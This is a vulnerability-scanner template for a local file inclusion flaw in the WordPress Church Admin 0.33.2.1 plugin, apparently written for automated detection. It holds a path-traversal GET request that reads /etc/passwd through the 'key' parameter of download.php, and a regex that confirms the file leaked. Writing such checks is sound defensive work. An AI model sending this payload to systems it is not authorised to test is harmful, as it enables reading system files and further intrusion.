id: church-admin-lfi
name: WordPress Church Admin 0.33.2.1 - Local File Inclusion
severity: high
confidence: tentative
description: WordPress Church Admin 0.33.2.1 is vulnerable to local file inclusion via the "key" parameter of plugins/church-admin/display/download.php.
reference: CWE-22
tags:
- wordpress
- wp-plugin
- lfi
- wpscan
- vuln
requests:
- method: GET
  path: /wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
